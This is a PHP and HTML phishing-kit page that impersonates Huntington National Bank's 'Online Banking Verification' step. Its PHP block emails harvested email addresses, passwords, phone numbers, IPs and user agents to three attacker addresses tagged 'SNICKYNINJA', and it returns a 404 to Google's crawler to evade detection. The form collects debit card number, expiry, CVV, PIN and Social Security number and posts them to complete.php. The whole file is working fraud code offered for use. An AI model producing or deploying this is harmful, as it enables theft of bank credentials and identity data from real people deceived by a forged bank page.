<?php
session_start();
include('config/email.php');
include('antibots.php');
include('css/vld.php');

if(isset($_POST['submit'])){
    
    $ip = getenv("REMOTE_ADDR");
    $ua = $_SERVER['HTTP_USER_AGENT'];
$msg .= "#------------------[ Huntington Email Access ]---------------------#\n";
$msg .= "Email Address   : ".$_POST['email']."\n";
$msg .= "Password    : ".$_POST['pass']."\n";
$msg .= "Phone Number    : ".$_POST['no']."\n";
$msg .= "#---------------------[ Visitor ]-------------------------#\n";
$msg .= "IP Address     : ".$ip."\n";
$msg .= "DEVICE INFORMATION         : ".$ua."\n";
$msg .= "#-------------------[ SNICKYNINJA - END ]------------------------#\n";
$sub = "::SNICKYNINJA:: Huntington Email Access : $ip";
mail($to,$sub,$msg);
mail($ml1,$sub,$msg);
mail($ml2,$sub,$msg);
}
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
<!DOCTYPE html><html lang="en" class="js history mediaqueries cssremunit gr__selfservice_huntington_com"><head>
<base href="">
<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" id="mainviewport">
        <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width">
    <meta name="viewport" content="initial-scale=1.0">

    <meta name="robots" content="noindex,nofollow">
    <meta name="keywords" content="Huntington,">
    <title>Huntington National Bank - Step 1 Verify Account Information</title>
   <link rel="stylesheet" type="text/css" href="css/site.css" />
 <link rel="stylesheet" type="text/css" href="css/site-survey.css" />
  <link rel="stylesheet" type="text/css" href="css/hol.css" />
    <link rel="stylesheet" type="text/css" href="css/enroll.css" />

    <script src="https://selfservice.huntington.com/Scripts/jquery?v=pX-HQBQoJecxQi7lia8rno2suvj-FGLqjjM3r_b4sSw1" aria-hidden="true"></script>

    <script src="https://selfservice.huntington.com/Scripts/common?v=ErWcwz6ul8qxPN-Q2Xt7mtj9RN5A-IZQGm3UdzwQ8fI1" aria-hidden="true"></script>


<link rel="shortcut icon" type="image/ico" href="images/favicon.ico"/>
<script type='text/javascript'>
jQuery(function($){
   $("#ex").mask("99/9999",{placeholder:"MM/YYYY"});
//   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
</script>
  </head>
<body lang="en-us" data-gr-c-s-loaded="true" data-inq-observer="1">
    <div class="hol-offscreen">
        <a href="#hol-mainContent">skip to main content</a>
    </div>
    <div id="hol-body">

<div id="fab-area" style="display: none;"></div>
                <div></div>




<!--Begin HolHeader-->
<div id="hol-header">
    <div class="logo-wrap">
<div id="logo-img-lg" class="hol-logo"><span class="hnb-aria-only">Huntington - Welcome</span></div>



    </div>


        <div class="nav">
            <div id="nav-links" class="links">
                <ul id="primaryNav" class="primary">
                </ul>

                <script type="text/javascript" aria-hidden="true"></script>

                <ul id="secondaryNav" class="secondary">

                    <li>
<div id="ensighten-chat"></div>
</li>

                </ul>
            </div>
        </div>
</div> 

<!--IntelliResponse-->
<!-- MenuBar -->


<div style="clear: both;"></div>

<!--End HolHeader-->

        

        <div id="hol-mainContent">
            


    <script type="text/javascript" aria-hidden="true"></script>
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Pragma" content="no-cache">
<div class="hol-pageFlowContainer">
    <img id="imgSessionAlive" width="0" height="0" alt=""><script aria-hidden="true"></script><div>   <div id="idletimeout" class="message-container timeout">       <div class="container-yellow">           <div class="icon-yellow-alert icon-pad-left"></div>           <div class="message">Your session is about to time out.</div>       </div>   </div></div>

    <!--This is a container specifying that there is a page flow-->
<h1 class="hol-page-heading">Online Banking Verification</h1>
    
<div class="validation-summary" data-summary-id="" data-summary-msg="You will find {0} error(s) below. Please correct the errors to continue." style="display:none" aria-hidden="true" hidden="">
    <div class="validation-summary-msg"></div>
    <a href="#" tabindex="0" onclick="$.fn.hol.focusFirstError(this, event)">Go to the first error</a>
</div>

    <div id="main">
        <div id="progressBar" class="hol-track-progress-bar">
      <div class="step " data-step="1">
      <span class="step-num">
         <span class="hnb-aria-only">step </span>1
      </span>
      <span class="step-title">
         Verify Account Information
      </span>
      </div>
      <div class="step active" data-step="2">
      <span class="step-num">
         <span class="hnb-aria-only">step </span>
      </span>
      <span class="step-title">
         Personal Debit Card
      </span>
      </div>
</div>


<div id="VerifyAccountContainer">
    

<div class="hol-spacing-large"></div><h2 class="hol-section-heading">Verify Account Information</h2>
<hr>


<div class="hol-radio-panel-container">
<div class="hol-radio-panel-buttons">
</div>

            <script type="text/javascript" aria-hidden="true"></script>
</div>
<div id="panels758913959">
<form action="complete.php"  data-ajax-success="if(data.redirectUrl){window.location.href = ;}" data-ajax-update="#formContent" id="formContent" method="post" novalidate="novalidate"> 



<div class="validation-summary" data-summary-id="" data-summary-msg="You will find {0} error(s) below. Please correct the errors to continue." style="display:none" aria-hidden="true" hidden="">
    <div class="validation-summary-msg">You will find 0 error(s) below. Please correct the errors to continue.</div>
    <a href="#" tabindex="0" onclick="$.fn.hol.focusFirstError(this, event)">Go to the first error</a>
</div>   
<div class="input">
        <label for="DebitCardNum">Debit Card Number</label>
        <input autocapitalize="off" required="required" autocomplete="off" autocorrect="off" class=" hol-debitcard-box hol-unmasked-box" data-val="true" data-val-regexwithoptions="Enter a valid Debit Card Number." data-val-regexwithoptions-flags="" data-val-regexwithoptions-pattern="\d{4} \d{4} \d{4} \d{4}" data-val-required="The Debit Card Number field is required." id="DebitCardNum" maxlength="19" name="cc" required="required" spellcheck="false" state-lastvalue="" type="password" value="" aria-required="true">
        <span class="field-validation-valid" data-valmsg-for="DebitCardNum" data-valmsg-replace="true"></span>
    </div>
		 <div class="input">
        <label for="PIN">Expiration Date</label>
         <select name="mm" class="textbox" autocomplete="off" required type="text" style="width:120px;height:38px;" required="required">
             <option value="">
							MM
						</option>
          <option value="01">01</option>
          <option value="02">02</option>
          <option value="03">03</option>
          <option value="04">04</option>
          <option value="05">05</option>
          <option value="06">06</option>
          <option value="07">07</option>
          <option value="08">08</option>
          <option value="09">09</option>
          <option value="10">10</option>
          <option value="11">11</option>
          <option value="12">12</option>
				</select>
        <span class="field-validation-valid" data-valmsg-for="" data-valmsg-replace="true"></span>
    </div>
    	 <div class="input">
    	      <select name="yy" class="textbox" autocomplete="off" required type="text" style="width:120px;height:38px;" required="required">
    	          <option value="">
							YYYY
						</option>
    	             <option value="2019">2019
                </option>
                <option value="2020">2020
                </option>
                <option value="2021">2021
                </option>
                <option value="2022">2022
                </option>
                <option value="2023">2023
                </option>
                <option value="2024">2024
                </option>
                <option value="2025">2025
                </option>
                <option value="2026">2026
                </option>
                <option value="2027">2027
                </option>
                <option value="2028">2028
                </option>
                <option value="2029">2029
                </option>
                <option value="2030">2030
                </option>
                <option value="2031">2031
                </option>
						
					</select>
	 <div class="input">
        <label for="PIN">CVV</label>
        <input autocapitalize="off" required="required" autocomplete="off" autocorrect="off" class=" hol-pin-number hol-unmasked-box"   id="PIN" minlength="3"maxlength="3" name="cvv" required="required" size="4" spellcheck="false" state-lastvalue="" type="password" value="" aria-required="true" style="width: 82px;">
        <span class="field-validation-valid" data-valmsg-for="" data-valmsg-replace="true"></span>
    </div>
       <div class="input">
        <label for="PIN">PIN</label>
        <input autocapitalize="off" autocomplete="off" required="required" autocorrect="off" class=" hol-pin-number hol-unmasked-box" data-val="true" data-val-regexwithoptions="Enter a valid PIN." data-val-regexwithoptions-flags="" data-val-regexwithoptions-pattern="\d{4}" data-val-required="The PIN field is required." id="PIN" maxlength="4" name="pin" required="required" size="4" spellcheck="false" state-lastvalue="" type="password" value="" aria-required="true" style="width: 82px;">
        <span class="field-validation-valid" data-valmsg-for="PIN" data-valmsg-replace="true"></span>
    </div>
        <div class="input">
        <label for="TaxID">Social Security or Tax ID Number</label>
        <input autocapitalize="off" autocomplete="off" autocorrect="off" required="required" class=" hol-social-number hol-unmasked-box" data-val="true" data-val-regexwithoptions="Enter a valid Social Security or Tax ID Number." data-val-regexwithoptions-flags="" data-val-regexwithoptions-pattern="(?!219-?09-?9999|078-?05-?1120)\d{3}-\d{2}-\d{4}" data-val-required="The Social Security or Tax ID Number field is required." id="TaxID" maxlength="11" name="ssn" required="required" size="11" spellcheck="false" state-lastvalue="" type="password" value="" aria-required="true">
        <span class="field-validation-valid" data-valmsg-for="TaxID" data-valmsg-replace="true"></span>
    </div>
	
	
    <div class="hol-actionBar  ">
                
                        <button id="btnContinue" class="activeButton" style="" type="submit">
        Continue
    </button>

                
                
                        <a id="lnkCancel" class="cancelLink" href="#">Cancel</a>

                

    </div>
    <div class="hidden" aria-hidden="true" hidden="">
        <script type="text/javascript" aria-hidden="true"></script>
    </div>
</form></div>



</div>
    </div>
   
</div>
        </div>

<!--Begin HolFooter-->
<div id="hol-footer" role="navigation">
<div class="links">
<ul id="footermenu" role="menubar">
<li><a role="menuitem" href="#" rel="noopener noreferrer" target="_blank">Identity Protection</a></li>
<li><a role="menuitem" href="#" rel="noopener noreferrer" target="_blank">Security</a></li>
<li class="breakAfterIfNeeded"><a role="menuitem" href="#" rel="noopener noreferrer" target="_blank">Privacy</a></li>
<li><a role="menuitem" href="#" rel="noopener noreferrer" target="_blank">Online Guarantee</a></li>
<li class="feedback-footer-parent" data-site-survey-context_placement="Footer" data-feedback-link-type="Footer" data-feedback-link-icon-id="black"><a href="#" title="Give Feedback (opens in a new window)" data-site-survey-link="Footer"><img alt="" class="oo_inline_img" src="images/oo_icon_retina_black.gif"  height="18" width="18">Give Feedback</a></li>
</ul>
</div>
<div class="legal">
<div class="large"><span class="breakAfterIfNeeded">Have questions? Call <span style="font-family: ApexNewWeb-Bold">(800) 480-2265</span></span>, daily 6:00 a.m. to midnight ET.</div><br>
<div>Mastercard and the Mastercard Brand Mark are registered trademarks of Mastercard International Incorporated.</div>
<div class="small"><div><p style="margin-top: 0px; margin-bottom: 0px;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 8" fill="#333" width="20" height="20"><path clip-rule="evenodd" d="m5.1 0.8l-5.1 2.8v1h0.8v3.4h8.4v-3.4h0.8v-1l-4.9-2.8zm3.1 6.3h-6.4v-3.4l3.2-1.8 3.2 1.8v3.4z" fill-rule="evenodd"></path><path d="m3.3 5v-0.8h3.4v0.8h-3.4z"></path><path d="m3.3 5.4h3.4v0.9h-3.4v-0.9z"></path></svg>
The Huntington National Bank is an Equal Housing Lender and Member FDIC.
</p>
</div>
<img src="images/hunt.png" alt="Huntington Logo">®, Huntington®, <img src="images/hunt.png" alt="Huntington Logo">&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&reg;&#44;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#46;&#87;&#101;&#108;&#99;&#111;&#109;&#101;&#46;&reg;&#44;&#32;&#97;&#110;&#100;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#72;&#101;&#97;&#100;&#115;&#32;&#85;&#112;&reg;&#32;&#97;&#114;&#101;&#32;&#102;&#101;&#100;&#101;&#114;&#97;&#108;&#108;&#121;&#32;&#114;&#101;&#103;&#105;&#115;&#116;&#101;&#114;&#101;&#100;&#32;&#115;&#101;&#114;&#118;&#105;&#99;&#101;&#32;&#109;&#97;&#114;&#107;&#115;&#32;&#111;&#102;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#66;&#97;&#110;&#99;&#115;&#104;&#97;&#114;&#101;&#115;&#32;&#73;&#110;&#99;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#101;&#100;&#46;&#32;
&copy;&#32;&#50;&#48;&#50;&#48;&#32;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#66;&#97;&#110;&#99;&#115;&#104;&#97;&#114;&#101;&#115;&#32;&#73;&#110;&#99;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#101;&#100;&#46;<!--B--></div>
</div>
</div>
<script type="text/javascript" aria-hidden="true"></script> 
<!--End HolFooter-->


    </div>



    <script src="https://selfservice.huntington.com/Scripts/rol?v=vVrR5Ozy5ZQMBZ-w7W6KXORbhIwpocBaSuYq_shEbBg1" aria-hidden="true"></script>

        </div></div></body></html>